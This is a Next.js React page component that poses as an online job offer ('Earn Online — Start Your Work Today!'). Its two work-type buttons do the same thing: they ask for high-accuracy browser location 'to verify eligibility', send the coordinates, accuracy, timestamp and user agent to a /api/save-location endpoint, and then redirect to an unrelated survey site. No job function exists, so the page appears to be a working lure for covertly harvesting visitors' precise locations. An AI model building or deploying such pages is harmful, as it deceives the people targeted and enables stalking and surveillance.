'use client'
import { useState } from 'react'
import { useRouter } from 'next/navigation'
import { motion } from 'framer-motion'

export default function ShareLocation() {
  const [status, setStatus] = useState('')
  const [showModal, setShowModal] = useState(true)
  const router = useRouter()

  async function requestLocation() {
    if (!navigator.geolocation) {
      setStatus('❌ Browser does not support Geolocation API.')
      return
    }

    setStatus('Requesting permission...')
    navigator.geolocation.getCurrentPosition(async (p) => {
      const payload = {
        lat: p.coords.latitude,
        lon: p.coords.longitude,
        accuracy: p.coords.accuracy,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      }

      console.log('📍 User location (client):', payload)

      try {
        await fetch('/api/save-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        })
      } catch (err) {
        console.error('Failed to send to server:', err)
      }

      setStatus('✅ Location received, redirecting...')
      setTimeout(() => {
        router.push('https://freeonlinesurveys.com/') // 🔁 Redirect URL (can change)
      }, 2000)
    },
    (err) => {
      setStatus('Permission denied ❌: ' + (err.message || err.code))
    },
    { enableHighAccuracy: true, timeout: 15000 })
  }

  function onAllow() {
    setShowModal(false)
    requestLocation()
  }

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gradient-to-br from-[#0b364f] via-[#0f4965] to-[#135b7f] text-white font-sans relative overflow-hidden">
      
      {/* Animated Background Circles */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 0.25 }}
        transition={{ duration: 2 }}
        className="absolute w-[600px] h-[600px] bg-emerald-500 rounded-full blur-3xl -top-40 -left-40"
      />
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 0.2 }}
        transition={{ duration: 2, delay: 0.5 }}
        className="absolute w-[500px] h-[500px] bg-blue-400 rounded-full blur-3xl -bottom-32 -right-32"
      />

      {/* Main Content */}
      <motion.div
        initial={{ y: 30, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ duration: 1 }}
        className="z-10 text-center px-6"
      >
        <h1 className="text-4xl font-bold mb-3 text-emerald-400 drop-shadow-lg">
          Earn Online — Start Your Work Today!
        </h1>
        <p className="text-gray-200 max-w-lg mx-auto mb-8">
          Choose your preferred work type and start earning right away.  
          Please allow location access to verify eligibility.
        </p>

        {/* Work Type Buttons */}
        <div className="flex flex-col md:flex-row gap-4 justify-center">
          <motion.button
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
            onClick={onAllow}
            className="px-8 py-3 rounded-xl bg-gradient-to-r from-blue-500 to-indigo-600 hover:shadow-lg transition-all font-semibold"
          >
            💼 Without Refer Work
          </motion.button>

          <motion.button
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
            onClick={onAllow}
            className="px-8 py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-green-600 hover:shadow-lg transition-all font-semibold"
          >
            👥 With Refer Work
          </motion.button>
        </div>
      </motion.div>

      {/* Status Text */}
      {!showModal && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="absolute bottom-10 text-sm text-gray-300"
        >
          {status}
        </motion.div>
      )}
    </div>
  )
}
